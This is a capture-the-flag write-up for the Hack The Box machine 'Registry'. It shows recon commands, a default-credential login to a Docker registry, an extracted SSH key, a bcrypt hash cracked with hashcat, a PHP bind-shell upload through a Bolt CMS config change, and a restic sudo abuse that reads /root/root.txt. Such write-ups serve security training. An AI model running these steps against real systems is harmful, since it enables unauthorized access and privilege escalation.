---
layout:     post
title2:      HacktheBox Writeup - Registry - QuantumlyConfused
title:     Hack the Box - Registry
date:       2020-4-5 09:00:00 -0400
summary:    HTB Registry machine walkthrough. Working with insecure Docker credentials we manage to extract a SSH key and corresponding password crumbs for an initial user foothold. Following that access we find a sqlite file containing Bolt CMS admin credentials. Logging into the CMS we quickly modify the config file to allow a PHP shell of our choosing to access the host as www-data. Finally once we have www-data access we are able to abuse a restic sudo rule to expose the root flag.
categories: [hack-the-box]
thumbnail:  cogs
keywords:   hackthebox,htb,pentest,redteam,infosec,cybersecurity,registry,docker,git
thumbnail:  https://blog.quantumlyconfused.com/assets/htb-registry/infocard.PNG
canon:      https://blog.quantumlyconfused.com/hack-the-box/2020/04/05/htb-machine-registry/
tags:
 - htb 
 - docker
 - bolt
 - cms
 - hashcat
 - sqlite
 - restic
---

<h1>Introduction</h1>
<p>
<img width="75%" height="75%" src="{{ '/assets/htb-registry/infocard.PNG' | relative_url }}">
</p>

<p>Working with insecure Docker credentials we manage to extract a SSH key and corresponding password crumbs for an initial user foothold. Following that access we find a sqlite file containing Bolt CMS admin credentials. Logging into the CMS we modify the config to allow a PHP shell of our choosing to access the host as www-data. Finally once we have www-data access we are able to abuse a restic sudo rule to expose the root flag.</p>

<p>In what seems like a continuing trend from 2019 machines I made this box much more difficult on myself than was needed. Starting with the docker portion I should have simply started the docker image and explored further inside rather than the convoluted way I approached it. For the Bolt CMS portion I focused much too long on the Twig execution in an attempt to get something useful to execute. Once I realized the configuration could be modified it was much easier from there.</p>

<p>Registry was probably one of the more informative machines I have worked on. While not focusing too much on any one technology, it provided more than a single opportunity to improve my overall knowledge and as a learning experience I greatly appreciated the approach.</p>

<h1>Initial Recon</h1>

<p>Let's kick it off with an NMAP scan.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Registry# nmap -sV -sC -p- 10.10.10.159
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-30 15:09 EDT
Nmap scan report for 10.10.10.159
Host is up (0.018s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http     nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after:  2029-05-03T21:14:35
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

<p>Right off the bat we notice a new subdomain: docker.registry.htb. We can add both this and registry.htb to our /etc/hosts file before we continue. Checking both domains in a browser seems to return a default nginx page.</p>

<p>
<img src="{{ '/assets/htb-registry/recon-4sites.PNG' | relative_url }}">
</p>

<p>We can dive down into this a bit further. I kicked off dirb runs for each of the domains on 80/443 and got a few interesting hits. The below was the most useful however.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Registry# dirb http://docker.registry.htb/ /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Oct 30 15:36:16 2019
URL_BASE: http://docker.registry.htb/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://docker.registry.htb/ ----
+ http://docker.registry.htb/v2 (CODE:301|SIZE:39)                           
{% endhighlight %}

<p>Browsing to the /v2 page we are presented with a Basic Auth challenge. I got slightly lucky here as my first guess was admin/admin and sure enough that was the proper credentials.</p>

<p>
<img src="{{ '/assets/htb-registry/recon-basicauth.PNG' | relative_url }}">
</p>

<p>By this point it was fairly clear we were working with a Docker Registry API. <a href="https://docs.docker.com/registry/spec/api/">Docker's docs</a> provided some background information on how to interact with the API.</p>

<blockquote>
Listing Repositories
<br><br>
Images are stored in collections, known as a repository, which is keyed by a name, as seen throughout the API specification. A registry instance may contain several repositories. The list of available repositories is made available through the catalog.
<br><br>
The catalog for a given registry can be retrieved with the following request:
<br><br>
GET /v2/_catalog
</blockquote>

<p>Sure enough, we are able to get some information out of the repository.</p>

<p>
<img src="{{ '/assets/htb-registry/recon-dockerregistry.PNG' | relative_url }}">
</p>
<p>
<img src="{{ '/assets/htb-registry/recon-dockerregistry2.PNG' | relative_url }}">
</p>

<p>I also figured it would be easier to move to the command line at this point for future steps.</p>

<p>
<img src="{{ '/assets/htb-registry/user-docker1.PNG' | relative_url }}">
</p>

<h1>User exploitation</h1>

<p>Next step was to leverage the bolt image. Disclaimer: from this part until I get proper shell access to the Registry machine I was quite messy. I'm omitting quite a few parts where I ended up going down deadends but I'm attempting to keep enough to show my thought process throughout it.</p>

<p>
<img src="{{ '/assets/htb-registry/user-dockerpull.PNG' | relative_url }}">
</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Registry# docker run -i docker.registry.htb/bolt-image /bin/bash
id
uid=0(root) gid=0(root) groups=0(root)
{% endhighlight %}

<p>Once running as root within the image we find a few interesting tidbits. Firstly, a password protected SSH keyfile.</p>

{% highlight shell %}
cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9

KF9YHXRjDZ35Q9ybzkhcUNKF8DSZ+aNLYXPL3kgdqlUqwfpqpbVdHbMeDk7qbS7w
KhUv4Gj22O1t3koy9z0J0LpVM8NLMgVZhTj1eAlJO72dKBNNv5D4qkIDANmZeAGv
7RwWef8FwE3jTzCDynKJbf93Gpy/hj/SDAe77PD8J/Yi01Ni6MKoxvKczL/gktFL
...
f41H5YN+V14S5rU97re2w49vrBxM67K+x930niGVHnqk7t/T1jcErROrhMeT6go9
RLI9xScv6aJan6xHS+nWgxpPA7YNo2rknk/ZeUnWXSTLYyrC43dyPS4FvG8N0H1V
94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWS+OLDh7lrcmm+GP54MsLBWVpr
-----END RSA PRIVATE KEY-----
{% endhighlight %}

<p>I could have saved myself a lot of pain if I kept exploring here instead of take a step back. Unfortunately I seem to like doing things the complicated way and went back to the docker image on my local machine.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Registry# docker save docker.registry.htb/bolt-image -o imagesave.tar
root@kali:~/Desktop/HTB/Registry# tar tvf imagesave.tar 
drwxr-xr-x root/root         0 2019-05-25 11:18 06b8ace0d7fbcb0958c7e733ca0302f8908216ff16fd05adcce743646c46006b/
-rw-r--r-- root/root         3 2019-05-25 11:18 06b8ace0d7fbcb0958c7e733ca0302f8908216ff16fd05adcce743646c46006b/VERSION
-rw-r--r-- root/root       482 2019-05-25 11:18 06b8ace0d7fbcb0958c7e733ca0302f8908216ff16fd05adcce743646c46006b/json
-rw-r--r-- root/root      3072 2019-05-25 11:18 06b8ace0d7fbcb0958c7e733ca0302f8908216ff16fd05adcce743646c46006b/layer.tar
drwxr-xr-x root/root         0 2019-05-25 11:18 10f6d95df2da28fe84a8f620262b5216e257c5c293ff58999888759fb4800e4a/
-rw-r--r-- root/root         3 2019-05-25 11:18 10f6d95df2da28fe84a8f620262b5216e257c5c293ff58999888759fb4800e4a/VERSION
-rw-r--r-- root/root       482 2019-05-25 11:18 10f6d95df2da28fe84a8f620262b5216e257c5c293ff58999888759fb4800e4a/json
-rw-r--r-- root/root     15872 2019-05-25 11:18 10f6d95df2da28fe84a8f620262b5216e257c5c293ff58999888759fb4800e4a/layer.tar
drwxr-xr-x root/root         0 2019-05-25 11:18 1f366db3c46ee1342df7553f3b5af64e6a8dc361e98529ee4b4b54042b9469ba/
-rw-r--r-- root/root         3 2019-05-25 11:18 1f366db3c46ee1342df7553f3b5af64e6a8dc361e98529ee4b4b54042b9469ba/VERSION
-rw-r--r-- root/root       482 2019-05-25 11:18 1f366db3c46ee1342df7553f3b5af64e6a8dc361e98529ee4b4b54042b9469ba/json
-rw-r--r-- root/root     12288 2019-05-25 11:18 1f366db3c46ee1342df7553f3b5af64e6a8dc361e98529ee4b4b54042b9469ba/layer.tar
drwxr-xr-x root/root         0 2019-05-25 11:18 259ad1dcccc93baa2431b4d02a953923a713cf3753bda84e1d2dfc3756e4f661/
-rw-r--r-- root/root         3 2019-05-25 11:18 259ad1dcccc93baa2431b4d02a953923a713cf3753bda84e1d2dfc3756e4f661/VERSION
-rw-r--r-- root/root       482 2019-05-25 11:18 259ad1dcccc93baa2431b4d02a953923a713cf3753bda84e1d2dfc3756e4f661/json
-rw-r--r-- root/root      3072 2019-05-25 11:18 259ad1dcccc93baa2431b4d02a953923a713cf3753bda84e1d2dfc3756e4f661/layer.tar
drwxr-xr-x root/root         0 2019-05-25 11:18 294f440a0c71e88b9f684b4aa16c9f636555b1552f5ae6effc929aac3167006e/
-rw-r--r-- root/root         3 2019-05-25 11:18 294f440a0c71e88b9f684b4aa16c9f636555b1552f5ae6effc929aac3167006e/VERSION
-rw-r--r-- root/root       482 2019-05-25 11:18 294f440a0c71e88b9f684b4aa16c9f636555b1552f5ae6effc929aac3167006e/json
-rw-r--r-- root/root      4608 2019-05-25 11:18 294f440a0c71e88b9f684b4aa16c9f636555b1552f5ae6effc929aac3167006e/layer.tar
-rw-r--r-- root/root      3922 2019-05-25 11:18 601499e98a60fad1012dffea66a4bafe8cb1b9f86215cc91ad698f27c73cea52.json
drwxr-xr-x root/root         0 2019-05-25 11:18 81cfd55e701325a99491ca34edda51624973827ee22986d282db2aabcf16a826/
-rw-r--r-- root/root         3 2019-05-25 11:18 81cfd55e701325a99491ca34edda51624973827ee22986d282db2aabcf16a826/VERSION
-rw-r--r-- root/root      1092 2019-05-25 11:18 81cfd55e701325a99491ca34edda51624973827ee22986d282db2aabcf16a826/json
-rw-r--r-- root/root      3584 2019-05-25 11:18 81cfd55e701325a99491ca34edda51624973827ee22986d282db2aabcf16a826/layer.tar
drwxr-xr-x root/root         0 2019-05-25 11:18 8d3a38ed8c74521645e23950192931dad42db3c2a17227903927293c417e5650/
-rw-r--r-- root/root         3 2019-05-25 11:18 8d3a38ed8c74521645e23950192931dad42db3c2a17227903927293c417e5650/VERSION
-rw-r--r-- root/root       482 2019-05-25 11:18 8d3a38ed8c74521645e23950192931dad42db3c2a17227903927293c417e5650/json
-rw-r--r-- root/root      6656 2019-05-25 11:18 8d3a38ed8c74521645e23950192931dad42db3c2a17227903927293c417e5650/layer.tar
drwxr-xr-x root/root         0 2019-05-25 11:18 a5b18303f904179fa1f08e031e952731c78135923bdb63a1e90f8fd1bd5d51c7/
-rw-r--r-- root/root         3 2019-05-25 11:18 a5b18303f904179fa1f08e031e952731c78135923bdb63a1e90f8fd1bd5d51c7/VERSION
-rw-r--r-- root/root       482 2019-05-25 11:18 a5b18303f904179fa1f08e031e952731c78135923bdb63a1e90f8fd1bd5d51c7/json
-rw-r--r-- root/root 267533824 2019-05-25 11:18 a5b18303f904179fa1f08e031e952731c78135923bdb63a1e90f8fd1bd5d51c7/layer.tar
drwxr-xr-x root/root         0 2019-05-25 11:18 d73ae8e1d64101c5a52228f401d05dd246ad10b0f55349351f6d2cd0e73f7928/
-rw-r--r-- root/root         3 2019-05-25 11:18 d73ae8e1d64101c5a52228f401d05dd246ad10b0f55349351f6d2cd0e73f7928/VERSION
-rw-r--r-- root/root       406 2019-05-25 11:18 d73ae8e1d64101c5a52228f401d05dd246ad10b0f55349351f6d2cd0e73f7928/json
-rw-r--r-- root/root 104231424 2019-05-25 11:18 d73ae8e1d64101c5a52228f401d05dd246ad10b0f55349351f6d2cd0e73f7928/layer.tar
-rw-r--r-- root/root       842 1969-12-31 19:00 manifest.json
-rw-r--r-- root/root       113 1969-12-31 19:00 repositories
{% endhighlight %}

<p>With the image layers saved as tar files, we descended into madness. Madness did end up being fruitful however and we are able to gather the SSH key's password required.</p>

<p>
<img src="{{ '/assets/htb-registry/user-docker-layer1.PNG' | relative_url }}">
</p>

<p>
<img src="{{ '/assets/htb-registry/user-docker-layer2.PNG' | relative_url }}">
</p>

<p>Sure enough, with the required information we are able to get on to Registry and claim the user flag.</p>

<p>
<img src="{{ '/assets/htb-registry/user-owned.PNG' | relative_url }}">
</p>

<h1>Root exploitation</h1>

<p>With our newfound access we can poke around and see if anything interesting pops up. Sure enough we find a very interesting file under /var/www/html we didn't see previously.</p>

{% highlight shell %}
bolt@bolt:/var/www/html$ cat backup.php 
<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
{% endhighlight %}

<p>If we keep going down the rabbit hole, we see a bolt folder under /var/www/html as well. A bit of poking and proding and we find that there is a Bolt CMS running under /bolt/bolt/.</p>

<p>
<img src="{{ '/assets/htb-registry/root-boltcms1.PNG' | relative_url }}">
</p>

<p>Unfortunately admin/admin did not work out this time, nor did any other obvious choices - guess we can't get lucky twice.</p>

<p>Switching our focus back to the the /var/www/html/bolt/app folder, we do find something interesting - a sqlite file, bolt.db. Let's get a copy of that back over to our machine and see what we can get from it.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Registry# sqlite3 bolt.db 
SQLite version 3.30.0 2019-10-04 15:03:17
Enter ".help" for usage hints.
sqlite> select * from bolt_users;
1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-10-31 02:51:13|10.10.14.133|Admin|["files://test.php","files://mrxy.php"]|1||||0||["root","everyone"]
sqlite> 
{% endhighlight %}

<p>Alright interesting! A quick search online and we find the right format to run this through hashcat.</p>

{% highlight shell %}
 .\hashcat64.exe --help | Select-String " 3200"

   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating Systems
{% endhighlight %}

<p>Let's run it through rockyou.txt and see if we can get a hit.</p>

{% highlight shell %}
.\hashcat64.exe -m 0 .\registry.hash .\rockyou.txt -m 3200
{% endhighlight %}

<p>
<img src="{{ '/assets/htb-registry/root-hashcat.PNG' | relative_url }}">
</p>

<p>Beautiful! With our newfound <code>strawberry</code> password we should be able to access the CMS instance.</p>

<p>
<img src="{{ '/assets/htb-registry/root-cmdadmin.PNG' | relative_url }}">
</p>

<p>I ended up wasting quite a bit of time here playing with the twig formating. Since we weren't able to upload php files I attempted to get arbitrary code execution through twig, however I was only able to get basic things executed properly.</p>

<p>
<img src="{{ '/assets/htb-registry/root-twig.PNG' | relative_url }}">
</p>

<p>
<img src="{{ '/assets/htb-registry/root-twig2.PNG' | relative_url }}">
</p>

<p>After taking a breath I took a different approach. It looks like we have the ability to modify configuration files. Let's add php explicitly and see if we can add our webshell files.</p>

<p>
<img src="{{ '/assets/htb-registry/root-cmsconfig.PNG' | relative_url }}">
</p>

<p>Two complications arose at this point. Firstly, it seems that the config file is being reverted every 2 minutes or so. Anything we want to accomplish needs to be done quickly to avoid being blocked. Second issue encountered was that any remote connections seemed to be blocked from our uploaded php shell. Thankfully this issue was a bit easier to solve as we already had a shell on the host as bolt.</p>

<p>The plan came down to:</p>

*  Edit the configuration to allow PHP upload 
*  Upload a PHP bind shell
*  Then connect to the bind shell using our bolt shell
   
<p>And all before the automated revert wipes out any of our progress. Thankfully within a minimal amount of attempts I managed to get through.</p>

<p>
<img src="{{ '/assets/htb-registry/root-wwwdatash.PNG' | relative_url }}">
</p>

<p>Once on we are able to confirm our previous observation regarding the sudo rule we can run as www-data.</p>

{% highlight shell %}
www-data@bolt:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
{% endhighlight %}

<p>Not being familiar with rustic operations a quick search later and <a href="https://restic.readthedocs.io/en/latest/040_backup.html#including-and-excluding-files">Rustic's docs</a> helped me understand the gist of what needs to happen. Despite that, I still managed to botch the command syntax and I anticlimatically got the root flag immediately. In all honesty I didn't realize at first the output WAS the flag itself - definitely a facepalm moment until I realized what my command was actually doing.</p>

{% highlight shell %}
www-data@bolt:/$ sudo /usr/bin/restic backup -r rest* --files-from /root/root.txt
restic backup -r rest* --files-from /root/root.txt
/ntrkzgnkotaxyju0ntrinda4yzbkztgw does not exist, skipping
Fatal: all target directories/files do not exist
{% endhighlight %}

<p>Where <code>ntrkzgnkotaxyju0ntrinda4yzbkztgw</code> was indeed the root flag.</p>

<p>Well, what a trip! With that our journey with Registry is complete! Thanks folks, until next time.</p>

<h1>Extra fun</h1>

<p>I always enjoy being on a machine where other folks are actively working on it as well. It generally results in interesting moments such as the below. I feel your pain my friend, I feel your pain...</p>

<p>
<img src="{{ '/assets/htb-registry/root-fun.PNG' | relative_url }}">
</p>